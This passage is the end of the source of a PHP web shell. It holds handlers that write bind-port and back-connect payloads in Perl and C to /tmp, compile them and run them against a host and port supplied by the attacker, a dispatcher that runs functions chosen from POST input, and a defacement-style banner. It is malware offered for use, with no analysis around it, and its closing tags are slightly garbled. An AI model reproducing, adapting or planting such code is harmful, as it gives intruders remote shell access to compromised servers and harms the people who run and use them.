		if($_POST['p1'] == 'bpp') {
			cf("/tmp/bp.pl",$bind_port_p);
			$out = ex(which("perl")." /tmp/bp.pl ".$_POST['p2']." &");
			echo "<pre class=ml1>$out\n".ex("ps aux | grep bp.pl")."</pre>";
		}
		if($_POST['p1'] == 'bcc') {
			cf("/tmp/bc.c",$back_connect_c);
			$out = ex("gcc -o /tmp/bc /tmp/bc.c");
			@unlink("/tmp/bc.c");
			$out .= ex("/tmp/bc ".$_POST['p2']." ".$_POST['p3']." &");
			echo "<pre class=ml1>$out\n".ex("ps aux | grep bc")."</pre>";
		}
		if($_POST['p1'] == 'bcp') {
			cf("/tmp/bc.pl",$back_connect_p);
			$out = ex(which("perl")." /tmp/bc.pl ".$_POST['p2']." ".$_POST['p3']." &");
			echo "<pre class=ml1>$out\n".ex("ps aux | grep bc.pl")."</pre>";
		}
	}
	echo '</div>';
	printFooter();
}
if( empty($_POST['a']) )
	if(isset($default_action) && function_exists('action' . $default_action))
		$_POST['a'] = $default_action;
	else
		$_POST['a'] = 'SecInfo';
if( !empty($_POST['a']) && function_exists('action' . $_POST['a']) )
	call_user_func('action' . $_POST['a']);
?>
<div id="cot_tl_fixed"><marquee>  </marquee></div>
We Can Do What You Can't Do </marquee></div>
?>
